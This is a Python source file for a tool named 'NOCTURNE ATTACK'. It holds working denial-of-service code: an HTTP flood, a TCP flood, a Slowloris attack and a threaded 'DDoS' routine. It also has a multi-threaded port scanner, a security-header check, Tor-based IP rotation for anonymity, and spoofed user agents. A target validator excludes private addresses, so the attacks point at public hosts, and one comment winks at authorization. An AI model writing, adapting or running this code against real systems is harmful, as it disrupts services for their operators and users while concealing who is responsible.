import os
import logging
import time
import socket
import sys
import json
import os.path
import threading
import random
import requests
import stem
import stem.control
from concurrent.futures import ThreadPoolExecutor
from urllib3.util.retry import Retry
from urllib3.exceptions import MaxRetryError
from requests.adapters import HTTPAdapter
from urllib.parse import urlparse

# Tor configuracion
TOR_SOCKS_PORT = 9050  # Puerto default del socket
TOR_CONTROL_PORT = 9051  # Puerto de control por defecto
TOR_PASSWORD = None  # Contraseña si está configurada en torrc
TOR_NEW_IDENTITY_DELAY = 5  # Segundos a esperar después de rotar IP

# CERTIFICACIÓN HTTPS Y MEJORA VISUAL POR ERROR DE CERTIFICACIÓN HTTPS LO PONGO PARA EVITAR QUE HAYA ERRORES VISUALES
import urllib3

urllib3.disable_warnings()
logging.captureWarnings(True)
# VULNERABILIDADES EN SERVIDORES O SISTEMAS EN LOS QUE TENGAN AUTORIZACIÓN, ¿VERDAD?


# Configuration configuracion
class Config:
    CONFIG_FILE = os.path.expanduser("~/.nocturne_config.json")

    # Valores por defecto
    _defaults = {
        "LANGUAGE": "english",
        "EMOJIS": False,
        "MAX_WORKERS": 200,
        "USE_TOR": True,
        "TOR_ROTATION_INTERVAL": 30,
    }

    # Cargar configuración al inicio
    @classmethod
    def load_config(cls):
        if os.path.exists(cls.CONFIG_FILE):
            try:
                with open(cls.CONFIG_FILE, "r") as f:
                    config = json.load(f)
                for key, value in config.items():
                    if key in cls._defaults:
                        setattr(cls, key, value)
            except Exception as e:
                print(f"Error loading config: {e}")
                # Si hay un error, usar valores por defecto
                for key, value in cls._defaults.items():
                    setattr(cls, key, value)
        else:
            # Usar valores por defecto si no existe el archivo
            for key, value in cls._defaults.items():
                setattr(cls, key, value)

    # Guardar configuración
    @classmethod
    def save_config(cls):
        try:
            config = {}
            for key in cls._defaults:
                config[key] = getattr(cls, key, cls._defaults[key])

            with open(cls.CONFIG_FILE, "w") as f:
                json.dump(config, f, indent=4)
        except Exception as e:
            print(f"Error saving config: {e}")


# Cargar configuración al iniciar
Config.load_config()


class TorController:
    def __init__(self, control_port=TOR_CONTROL_PORT, password=TOR_PASSWORD):
        self.control_port = control_port
        self.password = password
        self.controller = None

    def __enter__(self):
        try:
            self.controller = stem.control.Controller.from_port(port=self.control_port)
            if self.password:
                self.controller.authenticate(self.password)
            else:
                self.controller.authenticate()
            return self
        except Exception as e:
            print(f"Error connecting to Tor control port: {e}")
            return None

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.controller:
            self.controller.close()

    def new_identity(self):
        """Solicita una nueva identidad de Tor (nodo de salida)."""
        if not self.controller:
            print("Error: Controlador Tor no inicializado")
            return False

        try:
            # Forzar una nueva identidad
            self.controller.signal(stem.Signal.NEWNYM)

            # Esperar el tiempo recomendado para evitar problemas
            wait_time = max(self.controller.get_newnym_wait() or 5, 5)
            print(f"Rotando IP. Esperando {wait_time} segundos...")
            time.sleep(wait_time)

            # Verificar si la IP cambió
            old_ip = self.get_current_ip()
            time.sleep(1)
            new_ip = self.get_current_ip()

            if old_ip and new_ip and old_ip != new_ip:
                print(f"IP rotada exitosamente: {old_ip} -> {new_ip}")
                return True
            else:
                print("Advertencia: No se pudo verificar el cambio de IP")
                return False

        except Exception as e:
            print(f"Error al rotar la identidad: {e}")
            return False

    def get_current_ip(self, session=None):
        """Obte"""
        try:
            if session is None:
                session = self.get_tor_session()
            return session.get("https://api.ipify.org").text
        except Exception as e:
            print(f"Error getting IP: {e}")
            return None

    @classmethod
    def get_tor_session(cls):
        """Crea una sesión requests que usa Tor con configuración mejorada."""
        session = requests.session()

        # Configurar proxy Tor
        session.proxies = {
            "http": f"socks5h://127.0.0.1:{TOR_SOCKS_PORT}",
            "https": f"socks5h://127.0.0.1:{TOR_SOCKS_PORT}",
        }

        # Configurar timeout
        session.timeout = 30

        # Configurar headers comunes
        session.headers.update(
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Cache-Control": "max-age=0",
            }
        )

        # Configurar reintentos
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST"],
        )

        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        return session


from language import t, Config


def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)


#   ::'       Art by
#  :: :.    Ronald Allan Stanions

# GRACIAS RONALD, POR HACER PÚBLICA TU ARTE, DE CORAZÓN, NOCTURNE...


def get_random_banner():
    banners = [
        # Banner 1 - Estilo original mi favorito la verdad jsjs
        r'''
     .:'           NOCTURNE ATTACK            `:.
     ::'                                      `::
     :: :.      .:!!.            .:!!.      .: ::
      `:. `:.    !::!          !::!    .:'  .:'
       `::. `::  !:::'!.      .!':::!  ::' .::'
           `::.`::.  `!:'`:::::'':!'  .::'.::'
            `:.  `::::'  `!!'  '::::'   ::'
            :'*:::.  .:'  !!  `:.  .:::*`:
            :: HHH::.   ` !! '   .::HHH ::
           ::: `H TH::.  `!!  .::HT H' :::
           ::..  `THHH:`:   :':HHHT'  ..::
           `::      `T: `. .' :T'      ::'
             `:. .   :  >  <  :   . .:'
               `::'    \    /    `::'
                :'  .`. \__/ .'.  `:
                 :' ::.       .:: `:
                 :' `:::     :::' `:
                  `.  ``     ''  .'
                   :`...........':
                   ` :`.     .': '
                    `:  `"""'  :'   @Nocturne
        ''',
        # Banner 2 - Estilo alternativo 1 me gusta mucho
        r"""
    ███╗   ██╗ ██████╗  ██████╗████████╗██╗   ██╗██████╗ ███╗   ██╗███████╗
    ████╗  ██║██╔═══██╗██╔════╝╚══██╔══╝██║   ██║██╔══██╗████╗  ██║██╔════╝
    ██╔██╗ ██║██║   ██║██║        ██║   ██║   ██║██████╔╝██╔██╗ ██║█████╗  
    ██║╚██╗██║██║   ██║██║        ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══╝  
    ██║ ╚████║╚██████╔╝╚██████╗   ██║   ╚██████╔╝██║  ██║██║ ╚████║███████╗
    ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝
    ======================================================================
        """,
        # Banner 3 - Estilo alternativo 2 meh
        r"""
    ╔╦╗╔═╗ ╔═╗╔╦╗╦ ╦╔═╗╔╗╔╔╦╗  ╔═╗╔╦╗╔═╗╔═╗╔╦╗
    ║║║╠═╣ ║   ║ ║ ║║ ║║║║ ║║  ╠═╣ ║║║╣ ║   ║ 
    ╩ ╩╩ ╩ ╚═╝ ╩ ╚═╝╚═╝╝╚╝═╩╝  ╩ ╩═╩╝╚═╝╚═╝ ╩ 
    =========================================
    """,
        # Banner 4 - Estilo alternativo 3 me encanta que parezca cascada, este y el de arriba los creo chatGPT
        r"""
    ░▒▓███████▓▒░ ▒█████   ▒█████  ▄▄▄█████▓
    ░▒▓█   ▓███▄▒▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒
    ░▒███  ▓██▓  ▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░
    ░▒▓█  ░██▒  ░██   █▀ ▒██   ██░░ ▓██▓ ░ 
    ░░▒████▓▓  ░▒█████▓ ░ ████▓▒░  ▒██▒ ░ 
    ░ ▒░▒░▒░  ░▒▓▒ ▒ ▒ ░ ▒░▒░▒░   ▒ ░░   
      ░ ▒ ▒░  ░░▒░ ░ ░   ░ ▒ ▒░     ░    
    ░ ░ ░ ▒    ░░░ ░ ░ ░ ░ ░ ▒    ░      
        ░ ░      ░         ░ ░           
    ===============================
    """,
    ]
    return random.choice(banners)


def print_banner():
    # Mostrar un banner aleatorio, y... siii lo admito, me inspire en metasploit
    print(get_random_banner())


def display_menu():
    """Display interactive menu "segun es interactivo jeje"""
    print("\n" + "=" * 60)
    print(f" {t.get('banner')}")
    print("=" * 60)
    print(f"️  {t.get('warning')}")
    print(f"️  {t.get('warning_legal')}")
    print("=" * 60)


def restart_program():
    """Reinicia el programa para aplicar los cambios de configuración"""
    python = sys.executable
    os.execl(python, python, *sys.argv)


def get_language_selection():
    """Obtiene la selección de idioma del usuario"""
    print("\nSelect language / Selecciona idioma:")
    print("1. English")
    print("2. Español")
    choice = input("Choice / Opción (1-2): ").strip()

    if choice == "2":
        Config.LANGUAGE = "spanish"
        Config.EMOJIS = False
    else:
        Config.LANGUAGE = "english"
        Config.EMOJIS = True  # Asegurarse de que los emojis estén activados para inglés


def format_message(message):
    """Format message with or without emojis based on configuration"""
    if Config.EMOJIS:
        return message
    # Remove emojis for English/professional mode
    emoji_map = {
        "🔍": "[SCAN]",
        "✅": "[OK]",
        "🎯": "[TARGET]",
        "🌊": "[FLOOD]",
        "🚀": "[START]",
        "⚠️": "[WARN]",
        "❌": "[ERROR]",
        "📊": "[STATS]",
        "⏱️": "[TIME]",
        "📈": "[RATE]",
        "🌐": "[NETWORK]",
        "🔗": "[CONN]",
        "📦": "[PACKET]",
        "🐌": "[SLOW]",
        "🔧": "[CONFIG]",
        "📡": "[SOCKET]",
        "⏸️": "[PAUSE]",
        "💥": "[EXPLOSION]",
        "🛑": "[STOP]",
        "🔒": "[LOCK]",
        "🛠️": "[TOOL]",
        "🎲": "[CHOICE]",
        "🔢": "[NUMBER]",
        "💬": "[MESSAGE]",
        "🔄": "[RESTART]",
        "👋": "[EXIT]",
    }
    for emoji, replacement in emoji_map.items():
        message = message.replace(emoji, replacement)
    return message


def validate_target(host):
    """Validate the target to prevent scanning of private/reserved IPs."""
    try:
        ip_address = socket.gethostbyname(host)
        if socket.inet_aton(ip_address):
            if (
                not ip_address.startswith("127.")
                and not ip_address.startswith("192.168.")
                and not ip_address.startswith("10.")
                and not ip_address.startswith("172.")
            ):
                return True, ip_address
            else:
                return False, ip_address
    except socket.gaierror:
        return False, None
    return False, None


def port_scan(host, start_port=1, end_port=1000):
    """Enhanced port scanning"""
    print(format_message(t.get("scanning_ports").format(start_port, end_port, host)))
    open_ports = []

    def scan_port(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((host, port))
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    print(format_message(t.get("port_open").format(port, service)))
                    return port
        except:
            pass
        return None

    with ThreadPoolExecutor(max_workers=Config.MAX_WORKERS) as executor:
        results = executor.map(scan_port, range(start_port, end_port + 1))
        open_ports = [port for port in results if port is not None]

    print(format_message(t.get("scan_complete").format(len(open_ports))))
    return open_ports


def http_flood(target_url, num_requests, delay=0.1):
    """Enhanced HTTP Flood attack"""
    print(format_message(t.get("starting_http_flood").format(target_url)))

    # Normalize URL
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    ]

    success_count = 0
    failed_count = 0

    def send_request(request_num):
        nonlocal success_count, failed_count
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
            }

            response = requests.get(
                target_url, headers=headers, timeout=10, verify=False
            )
            if response.status_code < 400:
                success_count += 1
                print(
                    format_message(
                        t.get("request_success").format(
                            request_num, num_requests, response.status_code
                        )
                    )
                )
            else:
                failed_count += 1
                print(
                    format_message(
                        t.get("request_warning").format(
                            request_num, num_requests, response.status_code
                        )
                    )
                )

        except Exception as e:
            failed_count += 1
            error_msg = str(e)[:50] + "..." if len(str(e)) > 50 else str(e)
            print(
                format_message(
                    t.get("request_error").format(request_num, num_requests, error_msg)
                )
            )

    print(format_message(t.get("sending_requests").format(num_requests)))
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(send_request, range(1, num_requests + 1))

    end_time = time.time()
    total_time = end_time - start_time

    print(f"\n{t.get('http_summary')}:")
    print(f"{t.get('successful_requests')}: {success_count}")
    print(f"{t.get('failed_requests')}: {failed_count}")
    print(f"{t.get('total_time')}: {total_time:.2f} seconds")
    print(f"{t.get('requests_second')}: {num_requests / total_time:.2f}")

    return {
        t.get("successful_requests"): success_count,
        t.get("failed_requests"): failed_count,
        t.get("total_time"): f"{total_time:.2f} seconds",
        t.get("requests_second"): f"{num_requests / total_time:.2f}",
    }


def tcp_flood(target_ip, target_port, num_connections, message):
    """Enhanced TCP Flood attack"""
    print(format_message(t.get("starting_tcp_flood").format(target_ip, target_port)))

    if not message:
        message = "TCP Flood Test Packet"
    if isinstance(message, str):
        message = message.encode()

    connections_active = 0
    lock = threading.Lock()

    def create_connection(conn_id):
        nonlocal connections_active
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((target_ip, target_port))

            with lock:
                connections_active += 1
            print(
                format_message(
                    t.get("connection_established").format(conn_id, connections_active)
                )
            )

            # Send data continuously
            packet_count = 0
            while packet_count < 100:  # Send up to 100 messages per connection
                try:
                    packet_msg = (
                        message + f" [Conn:{conn_id} Packet:{packet_count}]".encode()
                    )
                    s.send(packet_msg)
                    packet_count += 1
                    time.sleep(0.3)
                except Exception as e:
                    print(
                        format_message(
                            t.get("connection_error_send").format(conn_id, e)
                        )
                    )
                    break

            s.close()
            with lock:
                connections_active -= 1
            return True

        except Exception as e:
            print(format_message(t.get("connection_failed").format(conn_id, e)))
            return False

    print(format_message(t.get("establishing_connections").format(num_connections)))
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=num_connections) as executor:
        results = list(executor.map(create_connection, range(1, num_connections + 1)))

    end_time = time.time()
    successful_connections = sum(results)

    print(f"\n{t.get('tcp_summary')}:")
    print(
        f"{t.get('successful_connections')}: {successful_connections}/{num_connections}"
    )
    print(f"{t.get('total_time')}: {end_time - start_time:.2f} seconds")

    return {
        t.get("successful_connections"): successful_connections,
        t.get("total_connections"): num_connections,
        t.get("total_time"): f"{end_time - start_time:.2f} seconds",
    }


def slowloris_attack(target_url, num_sockets=150):
    """Enhanced Slowloris attack"""
    print(format_message(t.get("starting_slowloris").format(target_url)))

    # Parse URL
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"

    sockets = []
    print(format_message(t.get("configuring_sockets").format(num_sockets)))

    # Create sockets
    for i in range(num_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))

            # Send incomplete headers
            headers = [
                f"GET {path} HTTP/1.1\r\n",
                f"Host: {host}\r\n",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                "Content-Length: 1000000\r\n",
                "X-a: ",
            ]

            for header in headers:
                s.send(header.encode())
                time.sleep(0.1)

            sockets.append(s)
            if (i + 1) % 50 == 0:
                print(
                    format_message(
                        t.get("sockets_connected").format(i + 1, num_sockets)
                    )
                )

        except Exception as e:
            print(format_message(t.get("socket_error").format(i + 1, e)))
            break

    print(format_message(t.get("sockets_active").format(len(sockets))))
    print(format_message(t.get("press_stop")))

    try:
        cycle = 0
        while sockets and cycle < 1000:
            cycle += 1
            active_sockets = len(sockets)

            for i, s in enumerate(sockets[:]):
                try:
                    # Send additional header every 15 seconds
                    s.send(f"b\r\n".encode())
                    time.sleep(15)
                except Exception as e:
                    sockets.remove(s)
                    try:
                        s.close()
                    except:
                        pass

            if active_sockets != len(sockets):
                print(
                    format_message(
                        t.get("sockets_active_count").format(len(sockets), num_sockets)
                    )
                )

            if not sockets:
                print(format_message(t.get("all_sockets_closed")))
                break

    except KeyboardInterrupt:
        print(f"\n{t.get('attack_stopped')}")
    finally:
        # Close all sockets
        for s in sockets:
            try:
                s.close()
            except:
                pass
        print(format_message(t.get("sockets_closed").format(len(sockets))))
    return {"message": t.get("attack_stopped")}


def check_security_headers(target_url):
    """Check for common security headers in a given URL."""
    print(format_message(t.get("checking_security_headers").format(target_url)))

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    headers_to_check = {
        "Strict-Transport-Security": "important",
        "Content-Security-Policy": "important",
        "X-Content-Type-Options": "important",
        "X-Frame-Options": "important",
        "Referrer-Policy": "optional",
        "Permissions-Policy": "optional",
    }

    results = {}

    try:
        response = requests.get(target_url, timeout=10, verify=False)
        response_headers = {k.lower(): v for k, v in response.headers.items()}

        for header, importance in headers_to_check.items():
            if header.lower() in response_headers:
                results[header] = {
                    "present": True,
                    "value": response_headers[header.lower()],
                    "importance": importance,
                }
            else:
                results[header] = {
                    "present": False,
                    "value": None,
                    "importance": importance,
                }

        print(format_message(t.get("security_headers_check_complete")))

    except Exception as e:
        error_msg = str(e)[:100] + "..." if len(str(e)) > 100 else str(e)
        print(format_message(t.get("security_headers_check_error").format(error_msg)))
        return None

    return results


def ddos_attack(target_url, duration=60):
    """Simulated DDoS attack with multiple techniques"""
    print(format_message(t.get("starting_ddos").format(target_url, duration)))

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    parsed = urlparse(target_url)
    host = parsed.hostname

    stop_attack = False
    requests_sent = 0

    def attack_worker(worker_id):
        nonlocal requests_sent
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        ]

        while not stop_attack:
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                }

                response = requests.get(
                    target_url, headers=headers, timeout=5, verify=False
                )
                requests_sent += 1
                if requests_sent % 100 == 0:
                    print(
                        format_message(
                            t.get("worker_progress").format(worker_id, requests_sent)
                        )
                    )

            except Exception:
                pass

    print(format_message(t.get("starting_workers")))
    start_time = time.time()

    # Start workers
    workers = []
    for i in range(10):
        worker = threading.Thread(target=attack_worker, args=(i + 1,))
        worker.daemon = True
        worker.start()
        workers.append(worker)

    # Execute for specified time
    try:
        while time.time() - start_time < duration:
            time.sleep(1)
            elapsed = time.time() - start_time
            print(
                format_message(
                    t.get("time_elapsed").format(
                        int(elapsed), requests_sent, f"{requests_sent / elapsed:.1f}"
                    )
                )
            )
    except KeyboardInterrupt:
        print(f"\n{t.get('attack_interrupted')}")

    stop_attack = True
    end_time = time.time()

    print(f"\n{t.get('ddos_summary')}:")
    print(f"{t.get('total_requests')}: {requests_sent}")
    print(f"{t.get('total_time')}: {end_time - start_time:.2f} seconds")
    print(f"{t.get('requests_second')}: {requests_sent / (end_time - start_time):.2f}")

    return {
        t.get("total_requests"): requests_sent,
        t.get("total_time"): f"{end_time - start_time:.2f} seconds",
        t.get("requests_second"): f"{requests_sent / (end_time - start_time):.2f}",
    }
